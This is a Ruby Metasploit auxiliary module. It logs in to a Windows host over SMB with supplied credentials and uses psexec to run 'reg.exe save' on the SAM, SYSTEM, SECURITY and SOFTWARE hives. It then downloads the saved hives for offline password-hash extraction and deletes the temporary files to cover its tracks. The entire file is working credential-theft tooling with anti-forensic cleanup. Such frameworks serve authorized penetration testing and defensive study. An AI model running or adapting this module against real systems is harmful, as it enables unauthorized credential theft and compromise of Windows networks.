##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Psexec
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT= Rex::Proto::SMB::Exceptions
	CONST= Rex::Proto::SMB::Constants

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'PsExec Key Registry Hives Download Utility',
			'Description'=> %q{
					This module authenticates to a Windows box over SMB and creates
				a copy of the key Registry Hives (SAM|SYS|SEC|SW) and moves to user specified temp dir. 
				It then pulls down copies of the Registry hives to store locally for offline parsing.
				These Registry hive copies can be used in combination with other tools for 
				offline extraction of password hashes and a wealth of other info. All of this is
				done without uploading a single binary to the target host!
			},
			'Author' => [
				'Royce Davis <rdavis[at]accuvant.com>', # @R3dy__
				'Modded by Hood3dRob1n'
			],
			'License'=> MSF_LICENSE,
			'References' => [
				[ 'URL', 'http://sourceforge.net/projects/smbexec' ],
				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ]
			]
		))
		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('TMPPATH',  [true, 'The path of the Windows Temp directory to use for backups', 'C:\\WINDOWS\\Temp']),
			OptString.new('LPATH',  [true, 'The LOCAL path to use for saving of backups', "/tmp/"]),
		], self.class)
	end

	def peer
		return "#{rhost}:#{rport}"
	end

	# This is the main control method
	def run
		# Initialize some variables
		@ip = datastore['RHOST']
		@smbshare = datastore['SMBSHARE']
		bat = "#{datastore['TMPPATH']}\\#{Rex::Text.rand_text_alpha(16)}.bat"
		text = "#{datastore['TMPPATH']}\\#{Rex::Text.rand_text_alpha(16)}.txt"

		# Try and connect
		if connect
			#Try and authenticate with given credentials
			begin
				smb_login
			rescue StandardError => autherror
				print_error("#{peer} - Unable to authenticate with given credentials: #{autherror}")
				return
			end

			#We can login, now to make backups and download the goods...
			print_status("#{peer} - Attempting to snatch key Registry hives....")
			make_reg_backups
			select(nil, nil, nil, 5.0) #Dramatic pause
			download_hives([ datastore['TMPPATH'] +"\\sys", datastore['TMPPATH'] + "\\sec", datastore['TMPPATH'] + "\\sam", datastore['TMPPATH'] + "\\sw" ])

			# Some quick cleanup before leaving
			cleanup_after(bat, text, datastore['TMPPATH'] +"\\sys", datastore['TMPPATH'] + "\\sec", datastore['TMPPATH'] + "\\sam", datastore['TMPPATH'] + "\\sw")
			disconnect
		end
	end

	#########################################################################################
	# Generate random filename for copy instead of using expected names (sys, sec, sam, hw) #
	#########################################################################################
	# Make backup copies of the main registry hives
	def make_reg_backups
		commandz = { 'SYSTEM' => "%COMSPEC% /C reg.exe save HKLM\\SYSTEM #{datastore['TMPPATH']}\\sys", 'SECURITY' => "%COMSPEC% /C reg.exe save HKLM\\SECURITY #{datastore['TMPPATH']}\\sec", 'SAM' => "%COMSPEC% /C reg.exe save HKLM\\SAM #{datastore['TMPPATH']}\\sam", 'SOFTWARE' => "%COMSPEC% /C reg.exe save HKLM\\SOFTWARE #{datastore['TMPPATH']}\\sw" }
		commandz.each do |hive,cmdlet|
			print_status("Copying #{hive} hive.....")
			begin
				psexec(cmdlet)
				select(nil, nil, nil, 1.0)
			rescue StandardError => hiveerror
				print_error("#{peer} - Problems making copy of #{hive} hive: #{hiveerror}")
			end
		end
	end

	# Download the Hive Copies we made
	def download_hives(arrayofhives)
		arrayofhives.each do |hive|
			file = hive.to_s.split("\\")[-1]
			print_status("#{peer} - Downloading #{hive} to #{datastore['LPATH']}#{file}.....")
			simple.connect("\\\\#{@ip}\\#{@smbshare}")
			funk = simple.open("#{hive.sub('C:', '')}", 'orb')
			data = funk.read
			funk.close
			f = File.open("#{datastore['LPATH']}#{file}", 'wb')
			f.write(data)
			f.close
			simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
		end
	end

	# Removes files created during execution.
	def cleanup_after(*files)
		simple.connect("\\\\#{@ip}\\#{@smbshare}")
		print_status("#{peer} - Executing cleanup...")
		files.each do |file|
			begin
				if smb_file_exist?(file.sub('C:', ''))
					smb_file_rm(file.sub('C:', ''))
				end
			rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
				print_error("#{peer} - Unable to cleanup #{file}. Error: #{cleanuperror}")
			end
		end
		left = files.collect{ |f| smb_file_exist?(f.sub('C:', '')) }
		if left.any?
			print_error("#{peer} - Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
		else
			print_status("#{peer} - Cleanup was successful")
		end
		simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
	end
end
